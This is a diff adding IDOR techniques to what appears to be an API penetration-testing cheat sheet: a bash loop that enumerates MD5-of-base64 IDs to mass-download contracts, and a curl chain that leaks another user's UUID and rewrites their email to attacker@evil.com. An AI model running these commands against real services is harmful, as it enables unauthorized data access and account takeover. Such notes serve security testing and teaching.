@@ -109,6 +109,51 @@ done
 ffuf -w ids.txt:ID -u http://TARGET/api/v1/users/ID -H "Authorization: Bearer JWT" -mc 200
 ```
 
+### Bypassing Encoded/Hashed References
+
+If IDs appear hashed (e.g., MD5):
+
+```bash
+# Check if it's base64 encoded UID then MD5 hashed
+echo -n 1 | base64 -w 0 | md5sum
+# cdd96d3cc73d1dbdaffa03cc6cd7339b
+
+# Mass enumerate encoded IDs
+for i in {1..10}; do
+  hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
+  curl -sOJ -X POST -d "contract=$hash" http://TARGET/download.php
+done
+```
+
+Look in JavaScript source for hashing function:
+
+```javascript
+// Example: contract parameter is base64(uid) then MD5 hashed
+function downloadContract(uid) {
+    $.redirect("/download.php", {
+        contract: CryptoJS.MD5(btoa(uid)).toString()
+    }, "POST");
+}
+```
+
+### IDOR via Information Disclosure Chain
+
+1. GET other user's UUID via info disclosure
+2. Use UUID to bypass access control on PUT/PATCH
+3. Modify their details or escalate to admin
+
+```bash
+# Step 1: Get another user's details (info disclosure)
+curl -X GET 'http://TARGET/api/v1/users/2' -H "Authorization: Bearer JWT"
+# Response: {"uid":"2", "uuid":"4a9bd19b...", "role":"employee"}
+
+# Step 2: Use their UUID to modify their profile
+curl -X PUT 'http://TARGET/api/v1/users/2' \
+  -H "Authorization: Bearer JWT" \
+  -H "Content-Type: application/json" \
+  -d '{"uid":"2", "uuid":"4a9bd19b...", "email":"attacker@evil.com"}'
+```
+
 ---
 
 ## Broken Authentication (API2)
